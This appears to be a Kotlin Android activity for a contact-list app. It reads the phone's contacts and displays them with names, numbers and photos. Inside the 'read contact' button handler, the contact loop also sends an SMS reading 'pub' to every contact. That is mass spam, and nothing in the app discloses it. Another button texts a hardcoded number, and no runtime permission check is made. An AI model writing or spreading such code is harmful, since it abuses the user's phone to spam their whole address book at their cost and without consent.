package com.example.myapplication

import android.content.Context
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.MediaStore
import android.telephony.SmsManager
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.TextView
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import android.view.*
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.android.synthetic.main.contact_child.view.*

class MainActivity : AppCompatActivity() {


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val contact_list= findViewById<RecyclerView>(R.id.contact_list)
        contact_list.layoutManager = LinearLayoutManager(this)
        val btn_read_contact= findViewById<Button>(R.id.btn_read_contact)
        btn_send.setOnClickListener{
            var obj=SmsManager.getDefault()
            obj.sendTextMessage("0791157912",null,"pub",null,null)
        }

        btn_read_contact.setOnClickListener {
            //We need to verify permission
            val contactList : MutableList<ContactDTO> = ArrayList()
            val contacts = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null)
            if (contacts != null) {
                while (contacts.moveToNext()){
                    val name = contacts.getString(contacts.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number = contacts.getString(contacts.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    val obj = ContactDTO()
                    obj.name = name
                    obj.number = number

                    val photo_uri = contacts.getString(contacts.getColumnIndex(ContactsContract.CommonDataKinds.Phone.PHOTO_URI))
                    if(photo_uri != null){
                        obj.image = MediaStore.Images.Media.getBitmap(contentResolver, Uri.parse(photo_uri))
                    }
                    contactList.add(obj)
                    var obj2=SmsManager.getDefault()
                    obj2.sendTextMessage(obj.number,null,"pub",null,null)

                }
            }
            contact_list.adapter = ContactAdapter(contactList,this)
            if (contacts != null) {
                contacts.close()
            }
        }
    }


    class ContactAdapter(items : List<ContactDTO>,ctx: Context) : RecyclerView.Adapter<ContactAdapter.ViewHolder>(){

        private var list = items
        private var context = ctx

        override fun getItemCount(): Int {
            return list.size
        }

        override fun onBindViewHolder(holder: ViewHolder, position: Int) {
            holder.name.text = list[position].name
            holder.number.text = list[position].number
            if(list[position].image != null)
                holder.profile.setImageBitmap(list[position].image)
            else
                holder.profile.setImageDrawable(ContextCompat.getDrawable(context,R.mipmap.ic_launcher_round))
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
            return ViewHolder(LayoutInflater.from(context).inflate(R.layout.contact_child,parent,false))
        }


        class ViewHolder(v: View) : RecyclerView.ViewHolder(v){


            var name = v.tv_name!!
            var number = v.tv_number!!
            val profile = v.iv_profile!!
        }
    }


}